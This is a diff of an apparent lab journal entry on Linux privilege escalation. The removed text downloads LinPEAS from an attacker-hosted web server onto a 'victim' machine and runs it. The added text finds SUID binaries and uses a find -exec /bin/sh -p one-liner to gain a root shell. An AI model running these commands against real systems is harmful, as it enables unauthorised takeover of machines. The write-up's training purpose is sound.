@@ -1,42 +1,24 @@
-# 🔍 Day 8: Privilege Escalation Enumeration (LinPEAS)
+# 🛡️ Day 8: Privilege Escalation (SUID Binaries)
 
 ## 📝 Executive Summary
-Now that I understand basic privilege escalation, today I focused on the reconnaissance phase of post-exploitation. Instead of manually guessing misconfigurations, I used **LinPEAS**, an automated enumeration tool designed to highlight privilege escalation paths on Linux systems.
+Privilege escalation often relies on finding files with "Set User ID" (SUID) permissions. If a binary is owned by root and has the SUID bit set, it executes with root privileges regardless of who runs it. Today, I hunted for misconfigured SUID binaries to gain system control.
 
-Using it on the compromised Ubuntu machine showed me how an attacker systematically discovers weaknesses — much more realistic than relying on obvious sudo errors.
+## 💻 Technical Analysis
 
----
-
-## 🧪 Technical Steps
-
-### 1. Hosting LinPEAS on Kali
-I downloaded LinPEAS and hosted it over a simple Python web server:
+### 1. Enumeration (Finding SUID Files)
+I used the `find` command to scan the entire filesystem for binaries with the SUID bit (permission 4000) active.
 
 ```bash
-curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-chmod +x linpeas.sh
-sudo python3 -m http.server 80
-```
+find / -perm -4000 2>/dev/null
+Finding: /usr/bin/find appeared in the list. This is abnormal for a standard Linux installation.
 
-### 2. Downloading & Running It on the Ubuntu Target
-On the victim system:
+Risk: The find utility has an -exec flag, which allows it to execute other commands. Since find itself runs as root (due to SUID), any command it executes will also run as root.
 
-```bash
-cd /tmp
-wget http://<kali-ip>/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-```
+2. The Exploit
+I utilized the GTFOBins methodology to exploit the binary. I instructed find to execute /bin/sh.
 
-### 3. Findings
-LinPEAS flagged multiple items:
+Bash
 
-- sudo misconfigurations  
-- world-writable paths  
-- potential PATH hijacking opportunities  
-- service misconfigurations  
-
-This gave me a clear picture of why enumeration is necessary — it reveals things I’d never spot manually.
-
----
-
+/usr/bin/find . -exec /bin/sh -p \; -quit
+3. Impact (Root Access)
+The command spawned a new shell session. Verifying with whoami confirmed that I had successfully escalated privileges to root.
